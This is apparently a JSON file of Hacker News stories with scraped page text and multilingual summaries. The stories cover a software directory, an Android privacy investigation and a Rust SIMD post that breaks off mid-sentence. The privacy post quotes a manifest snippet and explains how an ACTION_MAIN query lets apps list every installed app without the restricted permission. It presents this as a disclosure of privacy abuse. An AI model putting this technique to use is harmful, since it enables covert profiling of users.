[
  {
    "id": "f3ab3de7a255b5ff",
    "title": {
      "en": "Buy once, use forever A directory of one-time purchase software. Add yours",
      "ko": "영구 소프트웨어 가이드",
      "ja": "一生使えるソフト一覧"
    },
    "type": "story",
    "url": "https://buyoncesoftware.com/",
    "score": 135,
    "by": "richbowen",
    "time": 1743294514,
    "content": "Buy software, onceSay goodbye to subscription fatigue!Discover software you can buy once and own forever--no recurring charges, just tools that work for you, for life.Get featured for $99CategoriesAllAddonsAIBusiness & FinanceCADCommunicationContent & SEOData & AnalyticsDesignDevelopmentDocument & WritingEducationEntertainmentInfrastructureMarketingMusicNote TakingPhoto & VideoPrivacy & SecurityProductivitySocial MediaTemplate & ResourceUtilityMediBang Paint ProBy MediBang DesignMediBang Paint Pro is a digital painting and comic creation software. It's available for Windows, Mac, and iPad. MediBang Paint Pro is a FREE digital painting and comic creation software. It's available for Windows, Mac, and iPad.Website Buy Now Fire AlpacaBy Fire Alpaca DesignFireAlpaca is the free Digital Painting Software that is available in 10 languages and compatible with both Mac and Windows. Simple tools and controls let you draw an illustration easily. Download FireAlpaca right now!Website Buy Now DevonThinkBy Devon Technologies ProductivityDEVONthink is a knowledge base, information manager, and much more. In today's world, everything is digital. From shopping receipts to important research papers, your life often fills your hard drive in the form of emails, PDFs, Word documents, multimedia files, and more. Questions eventually pop up, like where do you store all of this stuff? How do you organize these very different file types, and even better, how do you find the exact file you're looking for the second you need it? It's almost as if you need a second brain just to keep your digital life straight.Website Buy Now BroadcastBy Simon Chiu MarketingBroadcast is a self-hosted email marketing platform  Unlimited email lists, unlimited subscribers, send one-time campaigns, send automation sequences, set up in 5 minutes35% OFFBF2024Website Buy Now LocalCan™By LocalCan Development#1 Ngrok alternative. Without subscription. With .local domains and top-rated UX.25% OFFBF25Website Buy Now ScreenpipeBy Screenpipe UtilityScreenpipe captures your computer while you work - including your meetings - letting you go back to any moment in an instant.30% OFFWebsite Buy Now ProtegoBy Edgar Sanchez UtilityProtego helps you block unwanted content, hide specific topics, and avoid spoilers on Reddit. The perfect Safari extension for a cleaner, more focused Reddit browsing experience on your Mac.25% OFFWebsite Buy Now DeskVaultBy Strongly Typed Business & FinanceAnalyze, chart, query and combine revenue and activity across all your Stripe accounts, all on your computer. Get smart summaries of recent important events and upcoming action items, view a calendar of upcoming payouts and renewals, or just list the raw data.30% OFFBF24Website Buy Now Small BetsBy Daniel Vassallo Social MediaSmall Bets is an online community teaching people how to make money through small entrepreneurial projects, rather than risking everything on a big startup. Members get lifetime access to expert-led courses, a supportive community, and practical guidance on launching profitable side projects.$50 OFFBF2024Website Buy Now FridayGPTBy Naveen Naidu AIAI Copilot for your Mac. Instant access to multiple LLM models, voice-to-text and quick AI actions.30% OFFABFCM30Website Buy Now Kerlig™By Kerlig AI#1 Grammarly alternative. AI Writing Assistant & Chat for macOS, 350+ models, vision, attachments, presets, tones of voice.50% OFF, 25% OFFBF50, BF25Website Buy Now ThreeDeeBy ThreeDee DesignA massive cartoon 3D models pack: 22+ diverse bundles.30% OFFblackfriday2024Website Buy Now XnapperBy Xnapper UtilityXnapper takes beautiful screenshots instantly. Focus on your content while it handles backgrounds, text recognition, annotations & more.40% OFFblackfriday2024Website Buy Now InspotypeBy Inspotype DesignInspotype makes designer's lives easier by quickly and seamlessly pairing fonts, color schemes and visual aesthetics for digital products.20% OFFBLACKFRIDAY2024Website Buy Now ContrastsBy Christoph Wendt UtilityContrasts is your tool for color contrast checking and accessibility. WCAG-compliant and ready for the European Accessibility Act. Improve your digital world now.40% OFFWebsite Buy Now Previous123…Next",
    "summary": {
      "en": "**Summary:**\n\nDiscover software that you can buy once and own forever, eliminating subscription fees. Here are some featured software options:\n\n1. **MediBang Paint Pro**: A free digital painting and comic creation tool available on Windows, Mac, and iPad.\n2. **Fire Alpaca**: Free digital painting software supporting multiple languages and easy-to-use tools for illustrations.\n3. **DEVONthink**: An information management tool that helps organize and find various digital files like emails and documents.\n4. **Broadcast**: A self-hosted email marketing platform with unlimited lists and subscribers.\n5. **LocalCan™**: An alternative to Ngrok without subscriptions, offering great user experience.\n6. **Screenpipe**: A utility for capturing your computer screen and meetings for easy access later.\n7. **Protego**: A Safari extension that blocks unwanted content and topics on Reddit.\n8. **DeskVault**: A tool for analyzing revenue and activity across Stripe accounts.\n9. **Small Bets**: An online community focused on making money through small projects with lifetime access to courses and support.\n10. **FridayGPT**: An AI assistant for Mac providing quick access to various models and voice-to-text features.\n11. **Kerlig™**: An AI writing assistant and chat alternative to Grammarly for macOS.\n12. **ThreeDee**: A collection of diverse cartoon 3D models.\n13. **Xnapper**: A screenshot tool that enhances images with text recognition and annotations.\n14. **Inspotype**: A tool for quickly pairing fonts and color schemes for design projects.\n15. **Contrasts**: A color contrast checking tool ensuring accessibility compliance.\n\nExplore these options to find tools that fit your needs without ongoing costs!",
      "ko": "한 번 구매하면 영구적으로 소유할 수 있는 소프트웨어를 찾아보세요. 구독료가 필요 없는 제품들입니다. 다음은 추천 소프트웨어 목록입니다.\n\nMediBang Paint Pro는 윈도우, 맥, 아이패드에서 사용할 수 있는 무료 디지털 페인팅 및 만화 제작 도구입니다. Fire Alpaca는 여러 언어를 지원하며, 일러스트레이션을 위한 사용하기 쉬운 도구를 제공하는 무료 디지털 페인팅 소프트웨어입니다. DEVONthink는 이메일과 문서 같은 다양한 디지털 파일을 정리하고 찾는 데 도움을 주는 정보 관리 도구입니다. Broadcast는 무제한 목록과 구독자를 지원하는 자체 호스팅 이메일 마케팅 플랫폼입니다. LocalCan™은 구독 없이 사용할 수 있는 Ngrok 대안으로, 뛰어난 사용자 경험을 제공합니다.\n\nScreenpipe는 컴퓨터 화면과 회의를 캡처하여 나중에 쉽게 접근할 수 있도록 도와주는 유틸리티입니다. Protego는 Safari 확장 프로그램으로, Reddit에서 원치 않는 콘텐츠와 주제를 차단합니다. DeskVault는 Stripe 계정의 수익과 활동을 분석하는 도구입니다. Small Bets는 작은 프로젝트를 통해 돈을 벌기 위한 온라인 커뮤니티로, 평생 동안 강의와 지원을 제공합니다. FridayGPT는 맥용 AI 비서로, 다양한 모델과 음성 인식 기능에 빠르게 접근할 수 있습니다.\n\nKerlig™는 macOS용 AI 글쓰기 도우미로, Grammarly의 대안입니다. ThreeDee는 다양한 만화 3D 모델을 모아놓은 컬렉션입니다. Xnapper는 텍스트 인식과 주석 추가 기능으로 이미지를 향상시키는 스크린샷 도구입니다. Inspotype는 디자인 프로젝트를 위한 글꼴과 색상 조합을 빠르게 찾아주는 도구입니다. Contrasts는 접근성 준수를 보장하는 색상 대비 검사 도구입니다.\n\n이 옵션들을 살펴보며 지속적인 비용 없이 필요한 도구를 찾아보세요!",
      "ja": "一度購入すれば永遠に所有できるソフトウェアを見つけて、定期的なサブスクリプション料金をなくしましょう。以下はおすすめのソフトウェアです。\n\nMediBang Paint Proは、Windows、Mac、iPadで利用できる無料のデジタルペイントと漫画制作ツールです。Fire Alpacaは、複数の言語に対応した無料のデジタルペイントソフトで、イラスト制作に便利な使いやすいツールが揃っています。DEVONthinkは、メールや文書などのさまざまなデジタルファイルを整理し、検索するための情報管理ツールです。Broadcastは、無制限のリストと購読者を持つ自己ホスト型のメールマーケティングプラットフォームです。\n\nLocalCan™は、サブスクリプションなしで利用できるNgrokの代替品で、優れたユーザー体験を提供します。Screenpipeは、コンピュータの画面や会議をキャプチャし、後で簡単にアクセスできるようにするユーティリティです。Protegoは、Safariの拡張機能で、Reddit上の不要なコンテンツやトピックをブロックします。DeskVaultは、Stripeアカウントの収益や活動を分析するためのツールです。\n\nSmall Betsは、小さなプロジェクトを通じてお金を稼ぐことに焦点を当てたオンラインコミュニティで、コースやサポートに生涯アクセスできます。FridayGPTは、Mac用のAIアシスタントで、さまざまなモデルや音声からテキストへの機能に迅速にアクセスできます。Kerlig™は、macOS向けのAIライティングアシスタントで、Grammarlyの代替として利用できます。ThreeDeeは、多様なカートゥーン3Dモデルのコレクションです。Xnapperは、テキスト認識や注釈機能を備えたスクリーンショットツールです。Inspotypeは、デザインプロジェクトのためにフォントとカラースキームを素早く組み合わせるツールです。Contrastsは、アクセシビリティ基準を満たすための色のコントラストをチェックするツールです。\n\nこれらのオプションを探して、継続的なコストなしで自分に合ったツールを見つけてください。"
    }
  },
  {
    "id": "abe58b40c749c235",
    "title": {
      "en": "My TV started playing a video in full screen by itself. What happened?",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://support.vizio.com/s/article/Ambient-or-Scenic-Mode-showing-on-my-TV?language=en_US",
    "score": 123,
    "by": "decimalenough",
    "time": 1743295305,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4ba75e729c4fc4d5",
    "title": {
      "en": "Everyone knows all the apps on your phone",
      "ko": "모두 아는 앱들",
      "ja": "みんなのアプリ事情"
    },
    "type": "story",
    "url": "https://peabee.substack.com/p/everyone-knows-what-apps-you-use",
    "score": 148,
    "by": "gniting",
    "time": 1743283592,
    "content": "Share this postPea BeeEveryone knows all the apps on your phoneCopy linkFacebookEmailNotesMoreDiscover more from Pea Beetales from indian web rabbit holes.Over 2,000 subscribersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inEveryone knows all the apps on your phoneMar 28, 202568Share this postPea BeeEveryone knows all the apps on your phoneCopy linkFacebookEmailNotesMore1013ShareUntil a few years ago, any app you installed on an Android device could see all other apps on your phone without your permission. Since 2022, with Android 11, Google removed this access from app developers. Under their new package visibility policy, apps should only see other installed apps if it’s essential to their core functionality. Developers must also explicitly declare these apps in the AndroidManifest.xml file - a required configuration file for all Android apps.For extremely specific use cases such as file managers, browsers or antivirus apps, Google grants an exception by allowing QUERY_ALL_PACKAGES permission, which provides full visibility into installed apps. I don’t use Android as my primary phone, but I have a spare one and I was really curious to find out which apps from Indian companies had checks to see what other apps I had installed.So I downloaded a few dozen Indian apps I could think of on top of my head and started reading their manifest files. Surely they will be respectful of my privacy and will only query apps essential to their app's core functionality? 🙃SubscribeIt's worth acknowledging that there are some legitimate reasons for an app to check which other apps are installed on your phone. For example, an app might check which UPI apps are installed to show relevant payment options. Most of the manifest files I examined included checks for these apps. Some also looked for app cloning or multi-account apps, likely for security and fraud detection. All acceptable use cases.But a few Indian companies went above and beyond with these checks. Let’s start with Swiggy. It has a staggering 154 package names listed in its manifest file, allowing it to query those apps on my phone. Here’s the full list:I don’t even know where to begin unpacking this madness. How is knowing whether I have the Xbox or the Playstation app installed on my phone essential to their Swiggy's core functionality? How will knowing if I have the Naukri or Upstox app help them deliver groceries to my doorstep?The wide range of categories of apps in this list strongly suggests Swiggy is collecting installed apps data for user profiling and to build a behavioural profile of their customers. This seems to be against Play Store's policies which considers the list of installed apps to be personal and sensitive user data.This reminded me of that ppt from Blume Ventures - the one that blue tick twitter accounts living in certain pin codes of Bengaluru passionately discuss amongst themselves for a week every year. It had this interesting slide on apps used by different Indias:Swiggy queries most of these apps and more on your phone. It not only knows which India you belong to, but it can pinpoint exactly where you fall within it.Let's talk about another app now, and it's the usual suspect, the undisputed champion of asshole design - Zepto. They have listed 165 apps to check for on your device.￼From Netflix to Bumble to Binance, the list includes nearly every popular app across all categories. There were recent reports of Zepto displaying different prices for iOS and Android users. With the help of this data, they can also show different pricing for different Android phones, which some customers are already seeing.Even though Swiggy and Zepto have to declare these apps to query in the manifest file, as a user, you have no visibility into this list when you download their apps from the Play Store.I also analyzed Swiggy and Zepto's apps for their delivery riders. The app query list is different from their consumer apps. Both include checks to see which other companies their riders work for. Here’s Zepto's list:But Swiggy takes it a step further - it also checks for personal loan apps, personal finance apps, and even keeps tabs on apps like like Ludo King or Carrom Pool on their delivery riders' phones.Can't we even play Ludo in peace without being spied on by our employers? Does even downtime need to be tracked by Swiggy? It’s embarrassing that Swiggy feels the need to include these ridiculous app queries on their delivery riders' phones.Speaking of personal loan apps in India, their predatory practices are well documented. A couple of years ago, there was a major crackdown that led to the removal of thousands of such apps from the Play Store. I took a look at some that still exist. Kreditbee is listed as one of the top apps in the personal loans space on the play store with over 50 million downloads. And can you believe their app checks for 860 apps installed on your phone? 860!!! I am sorry you may have to squint or zoom in a little to view this list. ￼I only skimmed through this list - there are just too many apps. I hope someone reading this can do a thorough analysis. It's probably because of the bubble I live in, but I hadn’t even heard of most of these apps. Even though most of them have tens of millions of downloads.Beyond the usual categories, I see there are checks for apps like Tamil Calendar, Odia Calendar, Qibla Direction Finder, mandir apps, astrology apps. They know what they’re doing.There is \"Jodii for Diploma, +2,10 below\", a matrimony app for those who haven’t graduated high school. It has 10M+ downloads.Then there is also \"गाय भैंस खरीदें बेचें Animall\" (cow buy/sell marketplace?) which also has more than 10M downloads.This list of apps is a window into how a large part of India uses their phones - their daily lives, habits, and priorities. Another leading personal loan app, Moneyview, with over 50 million downloads, has included checks for a staggering 944 apps in its manifest file - the highest among all the apps I examined. I am not including it in this post, you can read the full list here. I'm surprised KreditBee and Moneyview apps passed the Play Store's review. Play Store policy explicitly restricts personal loan apps from using the QUERY_ALL_PACKAGES permission.  But these apps are bypassing this restriction by individually listing every app they want to detect in their manifest file instead.I found only one manifest file which had the high-risk and sensitive QUERY_ALL_PACKAGES permission - it was Cred’s. Play Store grants a \"temporary exception\" to include this permission if apps have “a verifiable core purpose facilitating financial-transactions involving financially regulated instruments”.  But none of the other apps in the same segment as Cred I analyzed like PhonePe or PayTM had this permission in their manifest files. In fact, Cred offers personal loans too which as per Play Store’s Personal loans policy, is not eligible for this exception. Not sure how Cred is still allowed to keep this permission, which lets it see all the apps on your phone without any disclosures.I read the manifest files of around 50 popular apps from Indian companies. Apart from Swiggy, Zepto, Cred, and a couple of personal loan apps, most had fairly reasonable and respectful app query lists. Guess I expected worse. Maybe I am too cynical about these apps - could they actually be the good guys? 🙃As I was about to conclude this exercise, I noticed a couple of interesting lines when I was skimming through the manifest file of one of the apps:<queries>\n  [...]\n  <intent>\n    <action android:name=\"android.intent.action.MAIN\" />\n  </intent>\n  [...]\n</queries>I am no expert in Android development, but from what I understand, the \"ACTION_MAIN\" filter in the configuration above allows visibility to all installed apps that, simply put, have a screen.Since most installed apps run in the foreground and have a user interface, this filter grants developers access to see all the apps on your phone - without needing the QUERY_ALL_PACKAGES permission!To be sure, I vibe co -- I can't say it without wincing -- I vibe coded a basic android app and added the same \"ACTION_MAIN\" filter in my manifest file. And when I queried for installed packages, just as expected, this little hack returned a list of all the apps on my phone!!!This seems like a massive privacy loophole in Android. Surely Play Store would reject apps that use this hack as this is a blatant violation of their store's user data policy? Out of 47 Indian apps I randomly analyzed, 31 of them used the \"ACTION_MAIN\" filter - giving them access to see all the apps on your phone without any disclosure. That's 2 out of 3 apps.Apps using this hack: Astrotalk, Axis Mobile, Bajaj Finserv, BookMyShow, Cars24, Cure.fit, Fibe, Groww, Housing, Instamart, Ixigo, JioHotstar, KreditBee, KukuTV, LazyPay, Ludo King, Meesho, MoneyTap, Moneyview, Navi, NoBroker, Nykaa, Ola, PhonePe, PhysicsWallah, Slice, Spinny, Swiggy, Swiggy Delivery, Tata Neu, and Zomato.Apps that don't use this hack: Airtel Thanks, Blinkit, Byju’s, MyGate, Dream11, Flipkart, HDFC Mobile, Healthify, INDmoney, MyJio, Paytm, PaisaBazaar, ShareChat, Unacademy, Vedantu, ZeptoEven fucking Ludo King has this in its manifest file. So most Indian companies can actually see all the apps on your phone - they're just sneakier about it than the likes of Swiggy and Zepto. So much for being the good guys.In fact, Swiggy has got this filter config too, yet it still chooses to explicitly lists the apps it queries when it could just as easily do this discreetly behind closed doors like others. But I’m not complaining. This oversight from them gives a glimpse into Swiggy’s data collection practices. If Google had enforced this policy properly, we might have had similar visibility into other companies as well.All the manifest files I read are in my Github. The majority were downloaded on March 18 or 19.This hack isn’t exclusively used by apps from Indian companies. I checked the manifest files of some other popular apps. Facebook, Instagram, Snapchat, Subway Surfers, and Truecaller all have this config. Meanwhile, Amazon, Spotify, X, Discord, and WhatsApp didn’t. I didn’t investigate further beyond these.This makes me wonder, what was the whole purpose of Google's package visibility policy? It was supposed to protect users, yet most apps seem to have found ways around it anyway.And installed app data is very sensitive and personal. In 2022, Vice reported that a data marketplace called Narrative was selling data on users who had downloaded period-tracking apps right after news emerged that Roe v. Wade (which had federally protected abortion rights in the U.S.) could be overturned. This is frightening to even think about. Installed apps data is one data point. The extensive set of permissions each and every one of these apps have included in their manifest files, often far beyond what’s necessary is another can of worm for someone else to open. I’ll conclude this post with a tiny example from Zepto. They ask for READ_SMS permission. You can deny it, but it’s mandatory if you sign up for Zepto Postpaid. When you grant the permission, this is the list of sender IDs they check for in your inbox:Most of them are TRAI sender IDs of banks. They're likely reading these for their Postpaid plan eligibility check. They can still read this even if you never opt for it. And look how they've sneaked in SMSes from Blinkit, Swiggy, Bigbasket, Flipkart too.Their competitors are probably doing the same, they just didn’t leave behind such an obvious trail of evidence in the app itself. The point is when any app gets permissions like READ_SMS, as users, we have no visibility over when or what it’s accessing.Please remember the next time you casually install an app on your Android device, this information is being broadcast to the whole world. Data brokers will use it to profile you, cross-reference it with data about you from other ad networks and eventually it will be used to decide how much you’ll be asked to pay the next time you order a samosa.Thank you for reading. In case you subscribed to this newsletter after reading the \"What's inside this QR code menu at this cafe?\" post and can't find it anymore. Here's my tweet about it.I am also on Bluesky.Thanks for reading Pea Bee! Subscribe for free to receive new posts and support my work.Subscribe68Share this postPea BeeEveryone knows all the apps on your phoneCopy linkFacebookEmailNotesMore1013SharePrevious",
    "summary": {
      "en": "The article discusses privacy concerns regarding how certain Android apps, particularly from Indian companies like Swiggy, Zepto, and KreditBee, access information about other apps installed on users' phones. \n\nKey points include:\n\n1. **Changed Policies**: Google changed its policy in 2022 to restrict apps from seeing all installed apps on a phone without permission, but some apps still find ways around this.\n\n2. **Excessive Queries**: Some apps, like Swiggy and Zepto, have extensive lists of other apps they query, raising suspicion about user profiling and privacy violations. For example, Swiggy checks for 154 apps and Zepto for 165, even including irrelevant apps like gaming and finance apps.\n\n3. **Potential Loopholes**: Many apps utilize a loophole in Android’s system that allows them to see all installed apps without explicit permission, using a configuration called \"ACTION_MAIN\".\n\n4. **Wide Data Collection**: Some apps, particularly in the personal loan sector, check for hundreds of apps, which suggests they are gathering detailed user profiles, despite Google’s policies meant to protect user data.\n\n5. **Lack of Transparency**: Users are often unaware of what data is being collected or shared by the apps they install, which can lead to privacy breaches and misuse of their information.\n\nThe article emphasizes the importance of being cautious when installing apps, as they may be collecting sensitive data without users' knowledge.",
      "ko": "이 기사는 특정 안드로이드 앱, 특히 인도 기업인 스위기, 제프토, 크레딧비와 같은 앱들이 사용자 휴대폰에 설치된 다른 앱에 대한 정보를 어떻게 접근하는지에 대한 개인정보 보호 문제를 다루고 있습니다.\n\n첫 번째로, 구글은 2022년에 앱이 사용자의 허가 없이 설치된 모든 앱을 볼 수 없도록 정책을 변경했지만, 여전히 일부 앱은 이를 우회하는 방법을 찾고 있습니다. \n\n두 번째로, 스위기와 제프토와 같은 앱들은 다른 앱에 대한 쿼리가 지나치게 많아 사용자 프로파일링과 개인정보 침해에 대한 의구심을 불러일으킵니다. 예를 들어, 스위기는 154개의 앱을 확인하고, 제프토는 165개의 앱을 체크하며, 게임이나 금융 앱과 같은 관련 없는 앱도 포함되어 있습니다.\n\n세 번째로, 많은 앱들이 안드로이드 시스템의 허점을 이용해 명시적인 허가 없이 모든 설치된 앱을 볼 수 있는 방법을 사용하고 있습니다. 이들은 \"ACTION_MAIN\"이라는 설정을 활용합니다.\n\n네 번째로, 특히 개인 대출 분야의 일부 앱들은 수백 개의 앱을 확인하며, 이는 사용자에 대한 상세한 프로파일을 수집하고 있음을 시사합니다. 이는 구글의 사용자 데이터 보호 정책에도 불구하고 발생하는 일입니다.\n\n마지막으로, 사용자들은 자신이 설치한 앱이 어떤 데이터를 수집하거나 공유하는지 잘 알지 못하는 경우가 많아 개인정보 침해와 정보 오용의 위험에 처할 수 있습니다. 이 기사는 앱 설치 시 주의가 필요하다는 점을 강조하고 있습니다.",
      "ja": "この記事では、特にインドの企業であるSwiggy、Zepto、KreditBeeなどの一部のAndroidアプリが、ユーザーのスマートフォンにインストールされている他のアプリに関する情報にアクセスすることに関するプライバシーの懸念について述べています。\n\n重要なポイントとして、まずGoogleは2022年に、アプリがユーザーの許可なしにインストールされているすべてのアプリを見ることを制限する方針を変更しましたが、一部のアプリは依然としてこの制限を回避する方法を見つけています。\n\n次に、SwiggyやZeptoのようなアプリは、他のアプリに対して広範囲にわたる問い合わせを行っており、ユーザーのプロファイリングやプライバシー侵害について疑念を抱かせています。具体的には、Swiggyは154のアプリをチェックし、Zeptoは165のアプリを確認しており、ゲームや金融関連のアプリなど、関連性のないアプリも含まれています。\n\nさらに、多くのアプリはAndroidのシステムに存在する抜け穴を利用して、明示的な許可なしにインストールされているすべてのアプリを見ることができる「ACTION_MAIN」という設定を使用しています。\n\nまた、特に個人ローン関連のアプリは、数百のアプリをチェックしており、これは詳細なユーザープロファイルを収集していることを示唆しています。これは、ユーザーデータを保護するためのGoogleの方針に反しています。\n\n最後に、ユーザーはインストールしたアプリがどのようなデータを収集または共有しているのかを知らないことが多く、これがプライバシーの侵害や情報の悪用につながる可能性があります。この記事は、アプリをインストールする際には慎重になることの重要性を強調しています。"
    }
  },
  {
    "id": "245bdd8a48ef8f5c",
    "title": {
      "en": "Towards fearless SIMD, 7 years later",
      "ko": "두려움 없는 SIMD, 7년 후",
      "ja": "恐れ知らずのSIMD、7年後"
    },
    "type": "story",
    "url": "https://linebender.org/blog/towards-fearless-simd/",
    "score": 46,
    "by": "raphlinus",
    "time": 1743292320,
    "content": "Towards fearless SIMD, 7 years later\nRaph Levien, March 29, 2025\nSeven years ago I wrote a blog post Towards fearless SIMD, outlining a vision for Rust as a compelling language for writing fast SIMD programs.\nWhere are we now?\nUnfortunately, the present-day experience of writing SIMD in Rust is still pretty rough, though there has been progress, and there are promising efforts underway.\nAs in the previous post, this post will outline a possible vision.\nUp to now, Linebender projects have not used SIMD, but that is changing.\nAs we work on CPU/GPU hybrid rendering techniques, it's clear that we need SIMD to get maximal performance of the CPU side.\nWe also see opportunities in faster color conversion and accelerated 2D geometry primitives.\nThis blog post is also a companion to a podcast I recorded recently with André Popovitch.\nThat podcast is a good introduction to SIMD concepts, while this blog post focuses more on future directions.\nA simple example\nAs a running example, we'll compute a sigmoid function for a vector of 4 values.\nThe scalar version is as follows:\nfn sigmoid(x: [f32; 4]) -> [f32; 4] {\n    x.map(|y| y / (1.0 + y * y).sqrt())\n}\n\nThis particular simple code autovectorizes nicely (Godbolt link), but more complex examples often fail to autovectorize, often because of subtle differences in floating point semantics.\n(Editorial note: a previous version of this post didn't autovectorize (Godbolt) because optimization level was set at -O, which is less aggressive than -C opt-level=3, the latter of which is the default for release builds)\nSafety\nOne of the biggest problems with writing SIMD in Rust is that all exposed SIMD intrinsics are marked as unsafe, even in cases where they can be used safely.\nThe reason is that support for SIMD features varies widely, and executing a SIMD instruction on a CPU that does not support it is undefined behavior – the chip can crash, ignore the instruction, or do something unexpected.\nTo be used safely, there must be some other mechanism to establish that the CPU does support the feature.\nHere's the running example in hand-written intrinsic code, showing the need to write unsafe to access SIMD intrinsics at all:\n#[cfg(target_arch = \"aarch64\")]\nfn sigmoid_neon(x: [f32; 4]) -> [f32; 4] {\n    use core::arch::aarch64::*;\n    unsafe {\n        let x_simd = core::mem::transmute(x);\n        let x_squared = vmulq_f32(x_simd, x_simd);\n        let ones = vdupq_n_f32(1.0);\n        let sum = vaddq_f32(ones, x_squared);\n        let sqrt = vsqrtq_f32(sum);\n        let ratio = vdivq_f32(x_simd, sqrt);\n        core::mem::transmute(ratio)\n    }\n}\n\n#[cfg(target_arch = \"x86_64\")]\nfn sigmoid_sse2(x: [f32; 4]) -> [f32; 4] {\n    use core::arch::x86_64::*;\n    unsafe {\n        let x_simd = core::mem::transmute(x);\n        let x_squared = _mm_mul_ps(x_simd, x_simd);\n        let ones = _mm_set1_ps(1.0);\n        let sum = _mm_add_ps(ones, x_squared);\n        let sqrt = _mm_sqrt_ps(sum);\n        let ratio = _mm_div_ps(x_simd, sqrt);\n        core::mem::transmute(ratio)\n    }\n}\n\nThis is quite a simplified example.\nFor one, the SIMD width is fixed at 4 lanes (128 bits).\nMost likely, in practice you'd iterate over a larger slice, taking chunks equal to the natural SIMD width.\nMultiversioning\nA central problem important for SIMD is multiversioning and runtime dispatch.\nIn some cases, you know the exact CPU target, for example when compiling a binary you'll run only on your machine (in which case target-cpu=native is appropriate).\nBut when distributing software more widely, there may be a range of capabilities.\nFor highest performance, it's necessary to compile multiple versions of the code, and do runtime detection to dispatch to the best SIMD code the hardware can run.\nThis problem was expressed in the original fearless SIMD blog post, and there hasn't been significant advance at the Rust language level since then.\nIn the C++ world, the Highway library provides excellent SIMD support for a very wide range of targets, and also solves the multiversioning problem.\nAmong other uses are the codecs for the JPEG-XL image format.\nSuch codecs are an ideal use case for SIMD programming in general, and shipping them in a browser requires a good solution to multiversioning.\nHighway has a really good explanation of their approach to multiversioning.\nIt will be useful to study it carefully to see how they've solved various problems.\nAnd a concise way of saying what I'd like to see is \"Highway for Rust.\"\nOne possible approach is a crate called multiversion, which uses macros to replicate the code for multiple versions.\nA more recent macro-based approach is rust-target-feature-dispatch.\nIt is generally a similar approach to multiversion, and the specific differences are set out in that crate's README.\nAnother approach, as I believe first advocated in my 2018 blog post, is to write functions polymorphic on a zero-sized type representing the SIMD capabilities, then rely on monomorphization to create the various versions.\nOne motivation for this approach is to encode safety in Rust's type system.\nHaving the zero-sized token is proof of the underlying CPU having a certain level of SIMD capability, so calling those intrinsics is safe.\nA major library that uses this approach is pulp, which also powers the faer linear algebra library.\nI started putting together a pulp version of the running example, but ran into the immediate problem that it lacks a sqrt intrinsic (this would be easy enough to add, however).\nIt also works a bit differently, in that it only supports vectors of the natural width, not ones of a fixed width.\nFor general linear algebra, that's fine, but for some other applications it adds friction, for example colors with alpha are naturally chunks of 4 scalars.\nTo see an example of pulp code, as well as some discussion, see this Zulip thread.\nIn fearless_simd#2 I propose a prototype of reasonably-ergonomic SIMD multiversioning.\nLike the original fearless_simd prototype, vector data types are polymorphic on SIMD level.\nThe new prototype goes beyond that in several important ways.\nFor one, arithmetic traits in std::ops are implemented for vector types, so it's possible to add two vectors together, multiply vectors by scalars, etc.\nHere's what the running example looks like in that prototype:\n#[inline(always)]\nfn sigmoid_impl<S: Simd>(simd: S, x: [f32; 4]) -> [f32; 4] {\n    let x_simd: f32x4<S> = x.simd_into(simd);\n    (x_simd / (1.0 + x_simd * x_simd).sqrt()).into()\n}\n\nsimd_dispatch!(sigmoid(level, rgba: [f32; 4]) -> [f32; 4] = sigmoid_impl);\n\nAn advantage of the fearless_simd#2 prototype over pulp is a feature for downcasting based on SIMD level, so it's possible to write different code optimized for different chips.\nSee the srgb example in that pull request for more detail.\nThough there are clear advantages, at this point I'm not sure whether this is the direction to go.\nIt would be a lot of work to build out all the needed types and operations, with potentially a large amount of repetitive boilerplate code in the library, which in turn may cause issues with compile time.\nAnother possible direction is a smarter, compiler-like proc macro which synthesizes the SIMD intrinsics as needed based on the types and operations in the source program.\nOne additional consideration for Rust is that the implementation of runtime feature detection is slower than it should be.\nThus, feature detection and dispatch shouldn't be done at every function call.\nA good working solution is to do feature detection once, at the start of the program, then pass that token down through function calls.\nIt's workable but definitely an ergonomic paper cut.\nFP16 and AVX-512\nA general trend in parallel computation, really fueled by AI workloads, is smaller scalars with higher throughputs.\nWhile not yet common on x86_64, the FP16 extension is supported on all Apple Silicon desktop CPUs and most recent high-ish end ARM-based phones.\nSince Neon is only 128 bits wide, having 8 lanes is welcome.\nI find the f16 format to be especially useful for pixel values, as it can encode color values with more than enough precision to avoid visual artifacts (8 bits is not quite enough, though it is good enough for some applications, as long as you're not trying to do HDR).\nNative Rust support for the f16 type has not yet landed (tracked in rust#125440), which makes use of this scalar size harder.\nHowever, there is some support in the half library, and also the fearless_simd#2 prototype exports a number of FP16 Neon instructions through inline assembly.\nWhen true f16 support lands, it will be possible to switch over to intrinsics, which will have better optimization and ergonomics (for example, the same method will splat constants converted to f16 at compile time and f32 variables to be converted at runtime).\nAVX-512 is a somewhat controversial SIMD capability.\nIt first appeared in the ill-fated Larrabee project, which shipped in limited numbers as the Xeon Phi starting in 2010, and has since appeared in scattered Intel CPUs, but with compromises.\nIn particular, sprinkling even a small amount of AVX-512 code into a program could result in downclocking, reducing performance for all workloads (see Stack Overflow thread on throttling for more details).\nThese days, the most likely way to get a CPU with AVX-512 is an AMD Zen 4 or Zen 5; it is on their strength that AVX-512 makes up about 16% of computers in the Steam hardware survey.\nThe increased width is not the main reason to be enthusiastic about AVX-512.\nIndeed, on Zen 4 and most Zen 5 chips, the datapath is 256 bits so full 512 bit instructions are \"double pumped.\" The most exciting aspect is predication based on masks, a common implementation technique on GPUs.\nIn particular, memory load and store operations are safe when the mask bit is zero, which is especially helpful for using SIMD efficiently on strings.\nWithout predication, a common technique is to write two loops, the first handling only even multiples of the SIMD width, and a second, usually written as scalars, to handle the odd-size \"tail\".\nThere are lots of problems with this - code bloat, worse branch prediction, inability to exploit SIMD for chunks slightly less than the natural SIMD width (which gets worse as SIMD grows wider), and risks that the two loops don't have exactly the same behavior.\nGoing forward, Intel has proposed AVX10, and will hopefully ship AVX 10.2 chips in the next few years.\nThis extension has pretty much all of the features of AVX-512, with some cleanups and new features (until recently, AVX10 was defined has having a 256 bit base width and optionally 512, but 512 is now the baseline).\nIn addition, AVX10.2 will include 16-bit floats (currently available only in the Sapphire Rapids high-end server and workstation chips).\nAbout std::simd\nThe \"portable SIMD\" work has been going on for many years and currently has a home as the nightly std::simd.\nWhile I think it will be very useful in many 